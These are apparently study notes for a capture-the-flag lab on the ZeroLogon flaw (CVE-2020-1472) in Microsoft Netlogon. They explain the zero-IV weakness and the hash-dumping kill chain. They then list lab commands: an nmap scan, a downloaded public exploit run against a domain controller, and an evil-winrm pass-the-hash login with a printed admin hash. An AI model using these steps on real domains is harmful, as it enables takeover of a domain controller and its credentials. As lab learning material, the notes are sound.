ZeroLogon Vulnerability

CVE-2020-1472
-zero to admin in approximately one minute
-statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote protocol)
-critical authentication component of Active directory that handles authentication for user and machine accounts
-initalization vector of ComputeNetlogonCredential set to all zeros instead of a random string
-when an attacker sends a message only containing zeros with the IV of zero there is 1-256 chance the ciphertext will be zero

Machine accounts
-have no predefined acount lockout attempts
-64+ character alpha numeric password used to secure them
-Mimikatz can be used to dump the machine account password

-machine accounts often hold system level privileges 
-secretsdump.py - password dumping untility like mimikatz - dumps passwords within the domain

kill-chain:
Zero Logon to bypass Domain controller's authentication of machine account -> run Secretsdump.py -> crack/pass Domain Admin Hashes

Analyzing the MS-NRPC Logon Process
Authentication to NRPC (netlogon remote protocol)
1. Client creates a NetrServerReqChallenge (contains Domain Controller, Target Device, Nonce(16 bytes of zero))
2. Server recieves the NetrServerReqChallenge, Server generates Nonce(Server Challenge) sends back to client
3. Client computes NetLogon with Server Challenge provided
-params:
a. custom binding handle
b. account name
c. secure channel type
d. computer name
e. client credential string
f. negotiation flags
4. server recieves NetrServerAuthentication request and compute same request, server sends the required info back to client
*at this point: zero logon vuln
-3 and 4 are repeated to get the same computation b/n server and client 1-256
5. Server calculates the same value, client will re-verify, session key aggrement used for encrypted communication 


----------------------------------------------------------------------------------------------------------------------------

Proof of Concept
secura's Proof of Concept for Zero Logon: https://github.com/SecuraBV/CVE-2020-1472

method to change passwords over NRPC: hNetrServerPasswordSet2
Required fields for the method: 

NTSTATUS NetrServerPasswordSet2(
   [in, unique, string] LOGONSRV_HANDLE PrimaryName,
   [in, string] wchar_t* AccountName,
   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
   [in, string] wchar_t* ComputerName,
   [in] PNETLOGON_AUTHENTICATOR Authenticator,
   [out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
   [in] PNL_TRUST_PASSWORD ClearNewPassword
 );
 
 opNum: 30
 
 ----------------------------------------------------------------------------------------------------------------------------
 
 Lab it up!
 
 -install impacket
python3 -m pip install virtualenv
python3 -m virtualenv impacketEnv
source impacketEnv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
 
 -scan
 mkdir scans
 nmap -sV -sC -oA scans/initial [IP]
 
 -results:
 NetBIOS name: DC01
 NetBIOS user: <unknown>
 NetBIOS MAC: 02:fe:cf:50:be:69
 NetBIOS domain name: hololive.local
 
 -grab code: https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py
 python3 zerologon.py DC01 [IP]
 
 admin hash: 3f3ef89114fb063e3d7fc23c20f65568
 
 evil-winrm -u Adminstrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i [IP]
 \Desktop
 cat.root.txt
 THM{Zer0Log0nD4rkTh1rty}
 
 
 
 
 
